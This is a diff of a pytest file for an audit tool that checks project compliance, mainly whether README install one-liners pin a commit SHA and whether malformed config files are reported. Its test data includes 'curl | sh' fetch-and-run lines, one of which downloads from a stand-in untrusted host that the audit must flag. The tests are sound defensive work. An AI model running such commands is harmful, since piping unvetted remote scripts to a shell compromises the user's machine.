@@ -3,75 +3,28 @@
 from __future__ import annotations
 
 import json
-from typing import TYPE_CHECKING
+import subprocess
+from typing import TYPE_CHECKING, cast
 
 import pytest
 
+from punt_kit import audit
 from punt_kit.audit import run_audit
+from punt_kit.audit_verdict import FAIL, INFO, PASS
 from punt_kit.detect import detect
 from punt_kit.init import build_standard_deny_rules, build_standard_permissions
+from tests.helpers import (
+    make_compliant_hybrid as _make_compliant_hybrid,
+)
+from tests.helpers import (
+    make_compliant_python as _make_compliant_python,
+)
 
 if TYPE_CHECKING:
+    from collections.abc import Callable
     from pathlib import Path
 
-
-def _make_compliant_python(tmp_path: Path) -> None:
-    """Create a fully compliant Python project scaffold."""
-    (tmp_path / "pyproject.toml").write_text(
-        '[project]\nname = "test"\n\n'
-        "[tool.ruff]\nline-length = 88\n\n"
-        "[tool.ruff.lint]\nselect = ['E']\n\n"
-        "[tool.mypy]\nstrict = true\n\n"
-        '[tool.pyright]\ntypeCheckingMode = "strict"\n\n'
-        "[tool.pytest.ini_options]\ntestpaths = ['tests']\n"
-    )
-    (tmp_path / "CLAUDE.md").write_text("# Agent Instructions\n")
-    (tmp_path / "CHANGELOG.md").write_text("# Changelog\n")
-    (tmp_path / "Makefile").write_text(
-        ".PHONY: help test lint type check format\n\n"
-        "help: ## Show targets\n"
-        "\t@echo help\n\n"
-        "test: ## Run tests\n"
-        "\tuv run pytest\n\n"
-        "lint: ## Lint\n"
-        "\tuv run ruff check .\n"
-        "\tuv run ruff format --check .\n\n"
-        "type: ## Type check\n"
-        "\tuv run mypy src/ tests/\n"
-        "\tuv run pyright src/ tests/\n\n"
-        "check: lint type test ## All gates\n\n"
-        "format: ## Format\n"
-        "\tuv run ruff format .\n"
-        "\tuv run ruff check --fix .\n"
-    )
-    (tmp_path / ".beads").mkdir()
-    (tmp_path / ".markdownlint.jsonc").write_text("{}\n")
-    (tmp_path / ".markdownlint-cli2.jsonc").write_text("{}\n")
-    src_pkg = tmp_path / "src" / "test_pkg"
-    src_pkg.mkdir(parents=True)
-    (src_pkg / "__init__.py").write_text("")
-    (src_pkg / "py.typed").write_text("")
-    workflows = tmp_path / ".github" / "workflows"
-    workflows.mkdir(parents=True)
-    (workflows / "lint.yml").write_text("name: Lint\n")
-    (workflows / "test.yml").write_text("name: Test\n")
-    (workflows / "docs.yml").write_text("name: Docs\n")
-    # Standard permissions — use detect() to get the right set for this project
-    claude_dir = tmp_path / ".claude"
-    claude_dir.mkdir(exist_ok=True)
-    info = detect(tmp_path)
-    (claude_dir / "settings.json").write_text(
-        json.dumps(
-            {
-                "permissions": {
-                    "allow": build_standard_permissions(info),
-                    "deny": build_standard_deny_rules(),
-                }
-            },
-            indent=2,
-        )
-        + "\n"
-    )
+    from punt_kit.detect import ProjectInfo
 
 
 def test_audit_docs_project(tmp_path: Path) -> None:
@@ -431,82 +384,6 @@ def test_audit_plugin_non_plugin_skips_check(tmp_path: Path) -> None:
 # --- Hybrid install.sh tests ---
 
 
-def _make_compliant_hybrid(tmp_path: Path) -> None:
-    """Create a compliant hybrid project (CLI + plugin) scaffold."""
-    _make_compliant_python(tmp_path)
-
-    # Add CLI entry point and version to pyproject.toml
-    (tmp_path / "pyproject.toml").write_text(
-        '[project]\nname = "test"\nversion = "1.0.0"\n\n'
-        "[project.scripts]\ntest-cli = 'test_pkg:main'\n\n"
-        "[tool.ruff]\nline-length = 88\n\n"
-        "[tool.ruff.lint]\nselect = ['E']\n\n"
-        "[tool.mypy]\nstrict = true\n\n"
-        '[tool.pyright]\ntypeCheckingMode = "strict"\n\n'
-        "[tool.pytest.ini_options]\ntestpaths = ['tests']\n"
-    )
-
-    # Plugin structure (before detect so MCP servers are picked up)
-    plugin_dir = tmp_path / ".claude-plugin"
-    plugin_dir.mkdir(exist_ok=True)
-    (plugin_dir / "plugin.json").write_text(
-        json.dumps(
-            {
-                "name": "test-dev",
-                "description": "Test hybrid plugin",
-                "version": "1.0.0",
-                "author": {"name": "Punt Labs", "email": "hello@punt-labs.com"},
-            },
-            indent=2,
-        )
-        + "\n"
-    )
-
-    # Re-detect after pyproject.toml rewrite (now has CLI entry point + plugin)
-    info = detect(tmp_path)
-    (tmp_path / ".claude" / "settings.json").write_text(
-        json.dumps(
-            {
-                "permissions": {
-                    "allow": build_standard_permissions(info),
-                    "deny": build_standard_deny_rules(),
-                }
-            },
-            indent=2,
-        )
-        + "\n"
-    )
-
-    # Commands with dev variants
-    commands_dir = tmp_path / "commands"
-    commands_dir.mkdir(exist_ok=True)
-    (commands_dir / "audit.md").write_text("---\ndescription: Audit\n---\n")
-    (commands_dir / "audit-dev.md").write_text("---\ndescription: Audit dev\n---\n")
-
-    # Release/restore scripts
-    scripts_dir = tmp_path / "scripts"
-    scripts_dir.mkdir(exist_ok=True)
-    (scripts_dir / "release-plugin.sh").write_text("#!/usr/bin/env bash\n")
-    (scripts_dir / "restore-dev-plugin.sh").write_text("#!/usr/bin/env bash\n")
-
-    # Compliant install.sh
-    (tmp_path / "install.sh").write_text(
-        "#!/bin/sh\nset -eu\n"
-        "# marketplace update\n"
-        'claude plugin marketplace update "$MARKETPLACE_NAME" 2>/dev/null || true\n'
-        "# SSH fallback\n"
-        'git config --global url."https://github.com/".insteadOf "git@github.com:"\n'
-        "# verify\n"
-        '"$BINARY" doctor\n'
-    )
-
-    # README with SHA-pinned URLs
-    readme_url = "https://raw.githubusercontent.com/punt-labs/test/abc1234/install.sh"
-    (tmp_path / "README.md").write_text(
-        f"# Test\n\n```bash\ncurl -fsSL {readme_url} | sh\n```\n"
-    )
-
-
 def test_audit_hybrid_install_sh_passes(tmp_path: Path) -> None:
     """Audit passes for compliant hybrid project with install.sh."""
     _make_compliant_hybrid(tmp_path)
@@ -579,22 +456,89 @@ def test_audit_hybrid_install_sh_fails_no_doctor(tmp_path: Path) -> None:
 # --- README SHA pin tests ---
 
 
+def _readme_pin_findings(
+    tmp_path: Path,
+    readme: str,
+    *,
+    origin: str | None = "git@github.com:punt-labs/test.git",
+) -> list[tuple[str, str, str]]:
+    """What the README pin check reports for ``readme`` in a repo with ``origin``."""
+    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
+    if origin is not None:
+        subprocess.run(
+            ["git", "remote", "add", "origin", origin], cwd=tmp_path, check=True
+        )
+    (tmp_path / "README.md").write_text(readme)
+    check = cast(
+        "Callable[[ProjectInfo], list[tuple[str, str, str]]]",
+        vars(audit)["_check_readme_sha_pins"],
+    )
+    return check(detect(tmp_path))
+
+
+def _statuses(findings: list[tuple[str, str, str]]) -> list[str]:
+    return [status for status, _label, _detail in findings]
+
+
+_OWN = "https://raw.githubusercontent.com/punt-labs/test"
+
+
 def test_audit_readme_sha_pins_pass(tmp_path: Path) -> None:
-    """Audit passes when README has SHA-pinned raw GitHub URLs."""
-    _make_compliant_hybrid(tmp_path)
-    run_audit(str(tmp_path))
+    """A SHA-pinned install URL for this repository passes."""
+    findings = _readme_pin_findings(tmp_path, f"curl -fsSL {_OWN}/abc1234/install.sh\n")
+
+    assert _statuses(findings) == [PASS]
 
 
 def test_audit_readme_sha_pins_fail_branch(tmp_path: Path) -> None:
-    """Audit fails when README has branch name instead of SHA in raw GitHub URL."""
-    _make_compliant_hybrid(tmp_path)
-    readme_url = "https://raw.githubusercontent.com/punt-labs/test/main/install.sh"
-    (tmp_path / "README.md").write_text(
-        f"# Test\n\n```bash\ncurl -fsSL {readme_url} | sh\n```\n"
+    """A branch name instead of a SHA in this repository's install URL fails."""
+    findings = _readme_pin_findings(tmp_path, f"curl -fsSL {_OWN}/main/install.sh\n")
+
+    assert _statuses(findings) == [FAIL]
+    assert "main" in findings[0][2]
+
+
+def test_audit_readme_sha_pins_fail_release_tag(tmp_path: Path) -> None:
+    findings = _readme_pin_findings(tmp_path, f"curl -fsSL {_OWN}/v1.2.3/install.sh\n")
+
+    assert _statuses(findings) == [FAIL]
+
+
+def test_audit_readme_sha_pins_ignore_other_repositories(tmp_path: Path) -> None:
+    """Another tool's install one-liner is that tool's pin, not this project's."""
+    other = "https://raw.githubusercontent.com/punt-labs/vox/main/install.sh"
+
+    assert _readme_pin_findings(tmp_path, f"curl -fsSL {other}\n") == []
+
+
+def test_audit_readme_sha_pins_fail_an_untrusted_host(tmp_path: Path) -> None:
+    findings = _readme_pin_findings(
+        tmp_path, "curl -fsSL https://evil.example/punt-labs/test/abc1234/install.sh\n"
     )
 
-    with pytest.raises(SystemExit, match="1"):
-        run_audit(str(tmp_path))
+    assert _statuses(findings) == [FAIL]
+
+
+def test_audit_readme_sha_pins_use_the_projects_own_slug(tmp_path: Path) -> None:
+    """The URL names ``someone/test``: it is only this project's under that slug."""
+    url = "https://raw.githubusercontent.com/someone/test/main/install.sh"
+
+    findings = _readme_pin_findings(
+        tmp_path, f"curl -fsSL {url}\n", origin="git@github.com:someone/test.git"
+    )
+
+    assert _statuses(findings) == [FAIL]
+
+
+def test_audit_readme_sha_pins_say_when_there_is_no_slug_to_check_against(
+    tmp_path: Path,
+) -> None:
+    findings = _readme_pin_findings(
+        tmp_path, f"curl -fsSL {_OWN}/main/install.sh\n", origin=None
+    )
+
+    assert _statuses(findings) == [INFO]
+    assert "no remote" in findings[0][2]
 
 
 # --- Plugin version sync tests ---
@@ -826,3 +770,145 @@ def test_audit_hint_covers_both_kinds(
     out = capsys.readouterr().out
     assert "run punt init" in out
     assert "hand" in out
+
+
+def _bom_project(tmp_path: Path, pyproject: str) -> ProjectInfo:
+    (tmp_path / "pyproject.toml").write_bytes(("\ufeff" + pyproject).encode())
+    return detect(tmp_path)
+
+
+def test_audit_tool_config_reads_a_pyproject_that_starts_with_a_bom(
+    tmp_path: Path,
+) -> None:
+    info = _bom_project(
+        tmp_path,
+        '[project]\r\nname = "t"\r\n\r\n[tool.ruff]\r\nline-length = 88\r\n',
+    )
+    check = cast(
+        "Callable[[ProjectInfo], list[tuple[str, str, str]]]",
+        vars(audit)["_check_tool_config"],
+    )
+
+    findings = check(info)
+
+    assert findings
+    assert any(status == PASS for status, _label, _detail in findings)
+
+
+def test_audit_plugin_version_sync_reads_a_pyproject_that_starts_with_a_bom(
+    tmp_path: Path,
+) -> None:
+    plugin = tmp_path / ".claude-plugin" / "plugin.json"
+    plugin.parent.mkdir()
+    plugin.write_text('{"name": "t", "version": "0.1.0"}\n')
+    info = _bom_project(tmp_path, '[project]\r\nname = "t"\r\nversion = "0.1.0"\r\n')
+    check = cast(
+        "Callable[[ProjectInfo], list[tuple[str, str, str]]]",
+        vars(audit)["_check_plugin_version_sync"],
+    )
+
+    assert check(info) == [(PASS, "Plugin version matches pyproject.toml", "v0.1.0")]
+
+
+def test_audit_reads_a_settings_json_that_starts_with_a_bom(tmp_path: Path) -> None:
+    _make_compliant_python(tmp_path)
+    settings = tmp_path / ".claude" / "settings.json"
+    settings.write_bytes(b"\xef\xbb\xbf" + settings.read_bytes())
+
+    run_audit(str(tmp_path))  # a BOM is not a parse error
+
+
+def test_audit_fails_naming_the_unparseable_settings_json(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _make_compliant_python(tmp_path)
+    (tmp_path / ".claude" / "settings.json").write_text("{broken")
+
+    with pytest.raises(SystemExit, match="1"):
+        run_audit(str(tmp_path))
+
+    out = capsys.readouterr().out
+    assert "settings.json is not valid JSON" in out
+
+
+def test_audit_fails_naming_an_unparseable_plugin_manifest(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    manifest = tmp_path / ".claude-plugin" / "plugin.json"
+    manifest.parent.mkdir()
+    manifest.write_text("{broken")
+
+    with pytest.raises(SystemExit, match="1"):
+        run_audit(str(tmp_path))
+
+    out = capsys.readouterr().out
+    assert "plugin.json is not valid JSON" in out
+
+
+def test_audit_fails_on_an_unreadable_second_manifest(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    first = tmp_path / "plugin" / ".claude-plugin" / "plugin.json"
+    first.parent.mkdir(parents=True)
+    first.write_text('{"version": "1.0.0"}')
+    second = tmp_path / ".claude-plugin" / "plugin.json"
+    second.parent.mkdir()
+    second.write_text("{broken")
+
+    with pytest.raises(SystemExit, match="1"):
+        run_audit(str(tmp_path))
+
+    out = capsys.readouterr().out
+    assert "Plugin manifest is readable" in out
+    assert ".claude-plugin/plugin.json is not valid JSON" in out
+
+
+def test_audit_says_when_it_cannot_check_settings_local(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _make_compliant_python(tmp_path)
+    (tmp_path / ".claude" / "settings.local.json").write_text("{not json")
+
+    run_audit(str(tmp_path))
+
+    assert "settings.local.json could not be checked" in capsys.readouterr().out
+
+
+def test_audit_fails_naming_a_malformed_pyproject(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    (tmp_path / "pyproject.toml").write_text("[project\nname=")
+
+    with pytest.raises(SystemExit, match="1"):
+        run_audit(str(tmp_path))
+
+    out = " ".join(capsys.readouterr().out.split())
+    assert "pyproject.toml is not valid TOML" in out
+
+
+def test_an_unreadable_manifest_in_a_path_with_markup_is_reported_in_full(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    project = tmp_path / "[x][/dim]"
+    first = project / "plugin" / ".claude-plugin" / "plugin.json"
+    first.parent.mkdir(parents=True)
+    first.write_text('{"version": "1.0.0"}')
+    second = project / ".claude-plugin" / "plugin.json"
+    second.parent.mkdir()
+    second.write_text("{broken")
+
+    with pytest.raises(SystemExit, match="1"):
+        run_audit(str(project))
+
+    out = " ".join(capsys.readouterr().out.split())
+    assert "[x][/dim]/.claude-plugin/plugin.json is not valid JSON" in out
+
+
+def test_audit_readme_sha_pins_flag_an_uppercase_host_and_file_on_a_branch(
+    tmp_path: Path,
+) -> None:
+    url = "HTTPS://RAW.GITHUBUSERCONTENT.COM/punt-labs/test/main/INSTALL.SH"
+
+    findings = _readme_pin_findings(tmp_path, f"curl -fsSL {url}\n")
+
+    assert _statuses(findings) == [FAIL]
